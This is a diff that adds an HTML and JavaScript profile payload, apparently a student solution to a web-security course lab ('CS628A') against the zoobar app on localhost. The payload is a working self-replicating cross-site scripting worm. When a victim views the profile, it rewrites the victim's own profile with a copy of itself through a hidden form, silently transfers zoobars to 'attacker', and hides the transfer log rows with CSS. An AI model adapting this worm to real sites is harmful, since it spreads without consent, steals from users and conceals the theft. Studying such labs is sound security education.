@@ -1,0 +1,42 @@
+<h3>I Love CSretfcgvb628A!</h3>
+<script>
+	var i = 0;
+	var getv = function() {
+	    return i + 1;
+	};
+	var loopback = function(){
+			var wormprofile = document.getElementsByName("profile_update")[0];
+			wormprofile.value = "I Love CS628A!</b></div>"+
+				"<script>"+
+					"var i = "+ getv() +";"+
+					"var getv = " + getv.toString() + ";" +
+					"var loopback =" + loopback.toString() +";" +
+					"loopback();" +
+				"<\/script>"+
+				"<div id='worm'>" + 
+					document.getElementById("worm").innerHTML + 
+				"</div>" + 
+				"<style>"+
+					".log tr:nth-child(n+2){display:none;}"+
+				"<\/style>"+
+				"<div id=\"zoobars\" class=\"10\"><b>";
+		document.getElementById("transform").submit();
+		document.getElementById("wormform").submit();
+    };
+	loopback();
+</script>
+<div id="worm">
+	<iframe style="visibility:hidden; width:0; height:0; position:absolute" name="wormframe" id="wormframe"></iframe>
+		<form method="POST" name="wormform" id="wormform" action="http://localhost:8080/zoobar/index.cgi/" target="wormframe">
+		<input type="text" name="profile_update" value="" style="display:none">
+	</form>
+	<iframe style="visibility:hidden; width:0; height:0; position:absolute" name="transframe" id="transframe"></iframe>
+	<form method="POST" name="transform" id="transform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="transframe">
+		<input type="text" name="zoobars" value="getv()" style="display:none">
+		<input type="text" name="recipient" value="attacker" style="display:none">
+	</form>
+</div>
+<style>
+	.log tr:nth-child(n+2){display:none;}
+</style>
+<span id="zoobars" class="10"></span>
